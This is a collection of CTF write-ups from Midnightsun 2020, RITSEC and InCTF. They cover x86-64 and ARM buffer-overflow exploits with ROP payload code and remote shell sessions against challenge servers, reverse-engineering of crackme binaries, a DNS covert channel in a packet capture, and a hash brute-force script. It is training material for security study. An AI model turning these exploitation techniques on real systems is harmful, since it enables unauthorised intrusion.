<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-henriknero
description: CTF writeups and security challenges by henriknero.
---

# Writeups by henriknero

Source repository: `/repos/henriknero`

## Repository Index

- writeups/README.md
- writeups/admpanel2/README.md
- writeups/decoy/README.md
- writeups/freeze/README.md
- writeups/nexthop/README.md
- writeups/pwn3/README.md
- writeups/pybonhash/README.md

## Writeup Content


### File: writeups/README.md

# writeups
## RITSEC
[Freeze!](https://github.com/henriknero/writeups/tree/master/freeze)

[From our friends at Nexthop](https://github.com/henriknero/writeups/tree/master/nexthop)
## InCTF
[Decoy](https://github.com/henriknero/writeups/tree/master/decoy)

## Midnightsun CTF 2020
[admpanel2](https://github.com/henriknero/writeups/tree/master/admpanel2)

[pwn3](https://github.com/henriknero/writeups/tree/master/pwn3)

[pybonhash](https://github.com/henriknero/writeups/tree/master/pybonhash)



### File: writeups/admpanel2/README.md

# Admpanel2 - x86-64 pwn
We are supplied with the binary [admpanel2](https://github.com/henriknero/writeups/tree/master/admpanel2/admpanel2). This is the followup to the challenge admpanel. Supposedly having patched the previous binary so it should be secure. 
```
$ file admpanel2 
admpanel2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3c92c2bcbc592fcec34f26a30abfde62b414a025, stripped
```

The only change in the code that I was able to find was an added line to the exec_command function(0x4014d5):
```c
...
  else {
    printf("  Command to execute: ");
    fgets(local_408,0x400,stdin);
    iVar1 = strncmp(local_408,"id",2);
    if (iVar1 == 0) {
      local_408[2] = '\0'; //This line added.
      system(local_408);
    }
    else {
      puts("Any other commands than `id` have been disabled due to security concerns.");
      log_func("EXEC_HONEYPOT",is_admin,&DAT_004040e0,local_408);
    }
  }
...
```
So the bug was likely present before the patch. The bug that we found was located in the authentication function, with a followup fault in the log function. **Because of this we are able to cause a buffer overflow and are able to overwrite the return address in exec_command function.**
## Ghidra decompiled code of authenticate function(0x4013ed)
```c
...
  printf("  Input username: ");
  fgets(&DAT_004040e0,0x400,stdin);
  iVar1 = strncmp(&DAT_004040e0,"admin",5);
  if (iVar1 == 0) {
    printf("  Input password: ");
    fgets(local_408,0x400,stdin);
    iVar1 = strncmp(local_408,"password",8);
    if (iVar1 == 0) {
      is_admin = 1;
    }
...
```
There are two bugs in the authentication functions that we can utilize. 
1. So long as the first 5 chars are admin we are allowed supply 0x400-char username. 
2. If we have logged in once, we can change the username without losing admin rights.

## Ghidra decompiled code of log_function(0x40121a)
```c
...
  int bytes_written;
  size_t snpr_size;
  char *output_string;
  
  output_string = also_output_string?;
  snpr_size = 0x100;
  bytes_written = snprintf(output_string,0x100,"LOG: [OPERATION: %s] ",error_message);
  if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  output_string = output_string + bytes_written;
  snpr_size = snpr_size - (long)bytes_written;
  if (is_admin != 0) {
    bytes_written = snprintf(output_string,snpr_size,"[USERNAME: %s] ",username);
    if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    output_string = output_string + bytes_written;
    snpr_size = snpr_size - (long)bytes_written;
  }
  if (*command != '\0') {
    bytes_written = snprintf(output_string,snpr_size,"%s",command);
    if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    output_string = output_string + bytes_written;
    snpr_size = snpr_size - (long)bytes_written;
  }
...
```
Conveniently we already have a pointer to our username in RAX when we reach the return address in exec_command function. As we control this variable we simply set it to "/bin/sh;"+padding and then call the following gadget.
```
00401598 48 89 c7        MOV        RDI,RAX
0040159b e8 b0 fa        CALL       system
         ff ff

```

```
$ ./exploit 
[*] '/home/henrik/midnight2020/admpanel2/admpanel2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to admpanel2-01.play.midnightsunctf.se on port 31337: Done
[*] Switching to interactive mode
Any other commands than `id` have been disabled due to security concerns.
$ ls
chall
flag
redir.sh
$ cat flag
midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}
$  
```

The exploit script can be found [here](https://github.com/henriknero/writeups/tree/master/admpanel2/exploit)


### File: writeups/decoy/README.md

# Decoy writeup InCTF
The file given is a Pe32 executable. So we will work in Ida Pro Free on windows XP. Yay...

Loading the file into Ida gives us som good stuff directly:

<img src="screens/1.png" alt="drawing" width="500"/>

Following the string and xrefing it back we get to what looks like a printflag function. Looks like something interesting happens here. 

<img src="screens/2.png" alt="drawing" width="600"/>

By simply changing the program counter I try to go there. Aaaaaand it's a trap.

<img src="screens/3.png" alt="drawing" width="500"/>

We back up one more step in the program to try getting a picture of how stuff works. And yes, as seen by the xrefs we can get here in many ways (very, very many ways). This is totally a decoy.

<img src="screens/5.png" alt="drawing" width="500"/>

Okey, this is a big tree... Lets atleast start by marking the function we came from. 

<img src="screens/4.png" alt="drawing" width="700"/>

By looking at where the leafs of the tree goes we see that almost everyone leads to the functions I named "decoy_flag", "wrong_input" and "tiny_mistake".

<img src="screens/6.png" alt="drawing" width="500"/>

But there is one that goes somewhere else. So this is probably where we want to go.

# More debugging!
Let's try to walk through the execution.

We start by setting a breakpoint at the first compare in the tree. And it directly takes us in the wrong direction. Lets just set it to go the other way. We still havent input anything so lets just hope that it doesnt change the output. 

<img src="screens/7.png" alt="drawing" width="500"/>

We step our way until we get to the fgets call, then types the alphabet or whatever you like in to the terminal. Preferably some sequence that you can recognize later on. After the fgets the program tests that the string is longer than 16h(22). 

After this we come to the function sub4018D9, this is the first encryption function. The function takes the 11th until 22nd index of the string and throws it through the following steps. The most interesting thing is the xor. The function xor every character in the string with "0xB" and with "0x13"

<img src="screens/8.png" alt="drawing" width="500"/>

After the xor is done the program does a comparison with the following string 
```
(mv|GLp+Gv+
```

<img src="screens/9.png" alt="drawing" width="500"/>

We do xor on the string to get the reverse of the encrypted version. And we actually get something that looks like it could be a part of the key.

<img src="screens/10.png" alt="drawing" width="500"/>

Now we can replace the part of the string with our decrypted string to verify that it is correctly deciphered.

We continue through the tree. and get to decipher function 2.

The function snips the string into two parts. and then it add 4 to the ascii value of one part and 2 to the other part. Then compares the output against the stored string. 
```
}[2waHmrgxj
```
<img src="screens/11.png" alt="drawing" width="500"/>

<img src="screens/12.png" alt="drawing" width="500"/>

After encryption-function 2 there is a debugchecker so we have to look out for that. 

In function 3 the encrypted string is loaded in char by char to make it harder to find, but if we follow the debugger doing it, it's easy to find it. 

<img src="screens/13.png" alt="drawing" width="500"/>

The encryption function for this one is simple, only that it is a bit obfuscated. edx is the letter in the string and it is added with eax.

<img src="screens/14.png" alt="drawing" width="500"/>

<img src="screens/15.png" alt="drawing" width="500"/>

## Now for the last one!

The last function loads in the encrypted string much alike the last function but it has zeroes between each letter. 

<img src="screens/16.png" alt="drawing" width="500"/>

This gives the string 
```
n]9Uf9pA}
```
On the first iteration of the xor var_8 is 1. The program xor the input on the last index and then compares with the last index in the encrypted string. If they are the same the program steps one step backwards in the string. But this time it xors with the previous result. When it has xored the value it compares the character with the encrypted string. So now we know how the function encrypts the string.

<img src="screens/17.png" alt="drawing" width="500"/>

By running the encyption algorithm backwards we get the decrypted string.

<img src="screens/18.png" alt="drawing" width="500"/>

If we put it all together we get "inctf{Y0u_F0und_Th3_n33dl3_In_Th|z_H4y$t4cK}". And there you have your flag.



### File: writeups/freeze/README.md

# Freeze writeup RITSEC
This challenge was solved with @ludvigknutsmark

<img src="screens/chall.png" alt="drawing" width="500"/>

In this challenge we are supplied with the two files:
* main
* libpython2.7.so.1.0

Doing file on the executables gives us the following:

<img src="screens/file.png" alt="drawing" width="700"/>

The fact that the program uses a python-library is a strong indication that the program is some kind of compiled python program. Let's further investigate.

By using binwalk on main we get a bunch of zlib-compressed data-files. Let's extract those and see if there is anything interesting here. 

Testing file on all the files in the folder we see that there are som python 2.7 byte-compiled files.

<img src="screens/extract.png" alt="drawing" width="500"/>

Using uncompyle6 to decompile the bytecode-files we can read the python-scripts. The scripts didnt really hold any interesting information except for the filenames.

<img src="screens/pyinstaller.png" alt="drawing" width="700"/>

So now we know that it is installed using PyInstaller. 

After a good hour sifting through google I found out that PyInstaller for Linux has a built-in tool called "pyi-archie_viewer"

<img src="screens/mainpyc.png" alt="drawing" width="700"/>

Getting closer, but the file we get is labeled as data. The file is a .pyc file but we need to fix the header.
With a little help from https://www.fortinet.com/blog/threat-research/python-based-malware-uses-nsa-exploit-to-propagate-monero--xmr--.html the header of the file was fixed. 

When the bytecode is stored inside the executable the header is removed for some reason. The header is the byte-sequence \x03\xF3\x0D\x0A followed by a 4 byte timestamp. So we insert \x03\xF3\x0D\x0A\x00\x00\x00\x00 at the beginning of the file using bless.

<img src="screens/bless.png" alt="drawing" width="500"/>

After this is done we can decompile the .pyc file. 

<img src="screens/uncompyle6.png" alt="drawing" width="700"/>

If we just change the if statement in the file we should get the flag.

<img src="screens/wrongflag.png" alt="drawing" width="500"/>

Okey, so this was wierd... After we solved the challenge an announcement came up telling that there could be problems solving the challenge if you weren't in America. Luckily one of my teammates figured out that we could probably bruteforce it as it looks like the problem could only be because of some time-issue. 

Using the fact that we know the flag will start with "RITSEC{" we try by changing the last 5 numbers in the key and then print the decrypted message only if it contains RITSEC{. 

<img src="screens/bruteforce.png" alt="drawing" width="700"/>

This is the output of the script, with the correct flag at the top!

<img src="screens/flag.png" alt="drawing" width="500"/>




### File: writeups/nexthop/README.md

# From our friends at nexthop! 
## Forensics challenge at RITSEC

<img src="screens/chall.png" alt="drawing" width="500"/>

I start by checking the pcap in Wireshark because I think it has a okey GUI and it gives an idea of what im looking for.

This is the third packet looks interesting, nexthop.network in it, DNS. good stuff.
<img src="screens/third.png" alt="drawing" width="700"/>

Lets follow this stream and see if there is something interesting.

<img src="screens/followstream.png" alt="drawing" width="700"/>

For some reason the host on 192.168.174 has done very many dns queries to 192.168.1.1 and under a very short period of time. This is pretty suspicious. 

By looking at the hex output of the package we see that the class attribute of the message is flipping between 0 and 1 with some kind of pattern. This looks a bit like ascii-code. Also there happens to be exactly 144 packets(18*8). If we manually take out the first 4 words we get the following:
```
01010010 = R
01010011 = S
01111011 = {
00110001 = 1
```
"FLAG FORMAT IS RS{}" - This looks promising :)

Let's script out the rest of the conversation so that we only get the binary string we want.
```
tshark -r nethop.pcap -z "follow,udp,hex,2" |  grep -E " \.$" | awk '{print $2}' | cut -c 2- | tr -d '\n'
```
Mmmm one-liner <3.

The tshark command just prints out the hex of the conversation between the hosts.
As a nice coincidence the intersting line is all by itself. So using the the grep command to catch the the regex " \.$" should suffice to remove all unneeded rows.

<img src="screens/coincidence.png" alt="drawing" width="700"/>

After this its pretty straightforward what the command does. 

The final output:

<img src="screens/binary.png" alt="drawing" width="1000"/>

If we convert the message to ascii we get the flag "RS{1T5_4LW4Y5_DN5}", neat!




### File: writeups/pwn3/README.md

# Pwn3 - Simple ARM pwn
This challenge comes with the binary [pwn3](https://github.com/henriknero/writeups/tree/master/pwn3/pwn3)
```
 $ file pwn3 
pwn3: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=46d0723fb9ff9add7b00860a2382f32656a04700, stripped
```
When running the binary it firstly complains that we haven't supplied the file banner.txt, so we create this. Running it again we get the following:
```
$ ./pwn3
bannertext
buffer: 
```
So we can input to a char-buff via stdin. So anyway I just started blasting
```
 $ python -c "print('a'*0x200)" | ./pwn3 
buffertext
buffer: qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
```
Okey so, pwnlib...
```
pwn template --host pwn3-01.play.midnightsunctf.se --port 10003 pwn3 > exploit
```
```python
...
io = start()
array = cyclic(0x200)
io.sendline(array)

io.interactive()

```
![](screenshot_1.png)

So we have can overwrite the pc with the bufferoverflow, neat. We also see that we have space for some ropping looking at the stack-pointer. Now we just need to find a good gadget. We likely want to find system. 

Conveniently the author uses ```system(cat banner.txt)``` to print the banner. But if this is not the case we can probably search for /bin/sh to locate the function anyways. 

So now lets just prep the registers. I use ROPgadget to find good gadgets.
```
 $ ROPgadget --binary ./pwn3 --only pop
Gadgets information
============================================================
0x0001ddc0 : pop {r0, ip, sp, pc}
0x00015524 : pop {r0, r1, ip, sp, pc}
0x00013c9c : pop {r0, r1, r2, ip, sp, pc}
0x00013080 : pop {r0, r1, r2, r3, ip, sp, pc}
0x000169c4 : pop {r0, r1, r2, r3, r5, ip, sp, pc}
0x00028d90 : pop {r0, r1, r2, r4, ip, sp, pc}
0x00024460 : pop {r0, r1, r2, r6, r7, sb, sl, fp, ip, sp, lr, pc}
0x00014470 : pop {r0, r1, r3, ip, sp, pc}
0x000288f0 : pop {r0, r1, r4, ip, sp, pc}
0x00036558 : pop {r0, r1, r5, ip, sp, pc}
0x00014ee4 : pop {r0, r2, ip, sp, pc}
0x000158b4 : pop {r0, r2, r3, ip, sp, pc}
0x00023b08 : pop {r0, r2, r3, r4, ip, sp, pc}
0x000394f8 : pop {r0, r2, r3, r7, sb, fp, ip, sp, lr, pc}
0x00021edc : pop {r0, r2, r4, r5, ip, sp, pc}
0x0002aa94 : pop {r0, r2, r5, ip, sp, pc}
0x00014c34 : pop {r0, r3, ip, sp, pc}
0x0001c59c : pop {r0, r3, r4, ip, sp, pc}
0x00011b20 : pop {r0, r3, r4, r5, ip, sp, pc}
0x000108fc : pop {r0, r3, r4, r5, r6, r7, r8, ip, lr, pc}
0x00043858 : pop {r0, r3, r5, ip, sp, pc}
0x0002c3a4 : pop {r0, r3, r6, ip, sp, pc}
0x0001e6d8 : pop {r0, r4, ip, sp, pc}
0x0001fb5c : pop {r0, r4, pc}
...

$ ROPgadget --binary ./pwn3 --string /bin/sh
Strings information
============================================================
0x00049018 : /bin/sh
```
And to find the function I just search for references to /bin/sh in ghidra. Or in this case go to the function that takes "cat banner.txt" as argument. (0x14b5c). 

```python
...
array = cyclic(cyclic_find(b'jaab')) + "0123" + p32(0x0001fb5c) + p32(0x00049018) + "1111" + p32(0x14b5d) 
io.sendline(array)
io.interactive()
```
A good thing to notice is that I'm using 0x14b5d instead of 0x14b5c. This is due to ARM instruction alignment. So if you get wierd instructions jumping somewhere, just test shifting the address a little up or down. 

Running this against the remote server we get a shell and can simply print the flag.
```
$ ./exploit 
[*] '/home/henrik/midnight2020/pwn3/pwn3'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[+] Opening connection to pwn3-01.play.midnightsunctf.se on port 10003: Done
[*] Switching to interactive mode
                                                               ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄
                                                     ▄▄▄▄▄▄▄▄▄█  ▀                 ▀███
 ▄█████████▄ ▄███     ▄███ ▄███   ▄███ ▄█████████▄   ██████████         ▄   ▄    ▄    █
 ████▀▀▀████ ████     ████ █████▄ ████ ▀▀▀▀▀▀▀████   ██████████    ▄         ▄▀▀▄     █▄▀▀▄
 ████▄▄▄████ ████  ▄  ████ ███████████     ▄▄▄███▀   ▀▀▀▄▀▀▄▀▀█       ▄      █   ▀▄▄▄▄▀   █
 ██████████▀ ████▄███▄████ ████▀▀█████     ▀▀▀███▄   ███▀▄  ▀▀█              █            █
 ████▀▀▀▀▀▀  ██████▀██████ ████  ▀████ ▄▄▄▄▄▄▄████   █████▀▀▄▄█   ▄        ▄█   ▄█   ▄ ▄█  █
 ████        ████▀▀ ▀▀████ ████   ████ ██████████▀   ▀▀▀▀▀▀▀▀▀█      ▄      █ ██ ▄  ▄  ▄ ███
 ▀▀▀▀        ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀    ████████▄█  ▄           ▀▄  ▀▀▀▀▀▀▀ ▄▀
                                                           ▄▀ ▀█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀█▀▀▀█▀▀▀
                                                           █▄▄▀  █▄▄▀        █▄▄▀ ▀▄▄█
buffer: $ ls
banner.txt
flag
pwn3
redir.sh
$ cat flag
midnight{the_pwn_knight_16435f41118a38dd}
```



### File: writeups/pybonhash/README.md

# Pybonhash writeup
We are given a [.pyc file](https://github.com/henriknero/writeups/tree/master/pybonhash/pybonhash/pybonhash.cpython-36.pyc), this file can simply be decompiled using uncompyle6 which gives us [this](https://github.com/henriknero/writeups/tree/master/pybonhash/pybonhash/pybonhash.py). We are also supplied with a hash.txt that is 6528(204*32) characters long. 


## pybonhash file
```python
import string, sys, hashlib, binascii
from Crypto.Cipher import AES
from flag import key
assert len(key) == 42
data = open(sys.argv[1], 'rb').read()
assert len(data) >= 191
FIBOFFSET = 4919
MAXFIBSIZE = len(key) + len(data) + FIBOFFSET

def fibseq(n):
    out = [
     0, 1]
    for i in range(2, n):
        out += [out[(i - 1)] + out[(i - 2)
    return out

FIB = fibseq(MAXFIBSIZE)
i = 0
output = ''
while i < len(data):
    data1 = data[(FIB[i] % len(data))]
    key1 = key[((i + FIB[(FIBOFFSET + i)]) % len(key))]
    i += 1
    data2 = data[(FIB[i] % len(data))]
    key2 = key[((i + FIB[(FIBOFFSET + i)]) % len(key))]
    i += 1
    tohash = bytes([data1, data2])
    toencrypt = hashlib.md5(tohash).hexdigest()
    thiskey = bytes([key1, key2]) * 16
    cipher = AES.new(thiskey, AES.MODE_ECB)
    enc = cipher.encrypt(toencrypt)
    output += binascii.hexlify(enc).decode('ascii')

print(output)

```
So data i read from a file supplied in arg 1. The data is then hashed using the key supplied in a file flag.py and outputted to stdout. 

So the program iterates through the data and the key for len(data) times. Each iteration generating a 64byte string. Each iteration picks 2 characters from the data-string and 2 characters from the key at the index of a fibonacci number which is chosen by two different equations.

Each 2byte datastring is hashed using md5, and the 2 bytes taken from the key are multiplied to generate a 32byte key for a AES ECB crypto. 

```
md5(2 databytes) -> AES_ECB(2 keybytes*16) -> "output_hash"
```

So initially we thought we would need to utilize knowledge of the flag format ```midnight{xxxxxxxxxxxxxxxxxxxx}```. But the script hints that each character is ascii encoded which means "only" 128 possible solutions per key and data byte. So there are 128^4 possible inputs for each 64byte output. And we know that because of it being md5hashed we can be relatively certain that each input output 64byte is unique. **TLDR We bruteforced it.**

```python
output = open("pybonhash/hash.txt").read()
fuck = [output[i:i+64] for i in range(0, len(output), 64)]

import binascii, hashlib
from Crypto.Cipher import AES
from itertools import product
from string import ascii_letters
keyword_map= {}
for x in range(0,128):
    for y in range(0,128):
        keyword_map[binascii.hexlify(hashlib.md5((chr(x) + chr(y)).encode('utf-8')).digest())] = (chr(x) + chr(y))
for x in range(0,128):
    print(bytes([x, y]))
    for y in range(0,128):
        thiskey = bytes([x, y]) * 16
        cipher = AES.new(thiskey, AES.MODE_ECB)
        for key in keyword_map:
            enc = cipher.encrypt(key)
            if binascii.hexlify(enc).decode('ascii') in fuck:
                print(binascii.hexlify(enc).decode('ascii') + " : " + chr(x) + chr(y))
``` 
So at this moment I just put the output of this script into the [pybonhash script](https://github.com/henriknero/writeups/tree/master/pybonhash/pybonhash/pybonhash_mod.py) and map each output-hash to the key. Then print the key:

```midnight{xwJjPw4Vp0Zl19xIdaNuz6zTeMQ1wlNP}```



